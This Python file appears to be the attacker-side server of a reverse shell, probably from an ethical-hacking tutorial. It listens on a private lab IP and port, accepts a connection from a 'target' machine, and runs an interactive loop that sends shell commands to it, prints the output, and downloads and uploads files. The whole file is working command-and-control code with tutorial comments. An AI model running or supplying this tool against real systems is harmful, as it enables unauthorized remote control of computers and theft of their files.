import socket # Provides low-level networking interfaces. It allows you to create and manage network connections using protocols like TCP and UDP.
import json # Used for storing and transferring data between the browser and the server.
import os # Import the os module for interacting with the file system.

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def target_communication(): # sending shell commands and retrieving the results
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'exit' or command == 'quit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system('clear')
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET refers to the address-family ipv4. The SOCK_STREAM means connection-oriented TCP protocol. 
s.bind(('10.0.2.22', 12345)) # bind() method which binds it to a specific IP and port so that it can listen to incoming requests on that IP and port.       
print('[+] Listening for connection...') 

s.listen(5) # we're going to listen up to 5 different connections.

target, ip = s.accept() # The accept method initiates a connection with the client.
print('[+] Target Connected From: ' + str(ip)) # 
target_communication() # Exchanging messages (receiving, sending, processing commands, etc.) between the server and that specific client.